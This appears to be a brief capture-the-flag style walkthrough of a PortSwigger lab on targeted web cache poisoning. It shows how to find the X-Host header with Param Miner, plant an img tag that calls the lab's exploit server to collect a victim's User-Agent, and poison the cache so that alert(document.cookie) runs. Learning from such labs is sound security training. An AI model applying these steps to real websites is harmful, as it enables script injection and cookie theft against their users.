# Targeted web cache poisoning using an unknown header

## This lab is vulnerable to [web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning). A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs

### HINT: use extension param miner

---

### step 1

right click on / (home page of the lab) go to extension then param miner then guess param then guess header now go to extension

![screenshot](images/lab4_param_miner.jpg)

### step2

add X-Host: example.com

![screenshot](images/lab4_x_host.jpg)

### step3

![screenshot](images/lab4_expolite_payload.jpg)

### step4

![screenshot](images/lab4_x_host_repeater.jpg)

### step5

![screenshot](images/lab4_alert_box_pop_up.jpg)

### step6

to solve the lab we need user agent
so in comment section
`<img src="https://exploit-0aeb003b04c9a0da81c5ddc3010b00ac.exploit-server.net/test" />`

![screenshot](images/lab4_comment_with_payload.jpg)

### step7

go to log section
copy user-agent

![screenshot](images/lab4_access_log_expolit.jpg)

### step8

paste user-agent into repeter

![screenshot](images/lab4_user_agent_repeter.jpg)

reload home page lab solved
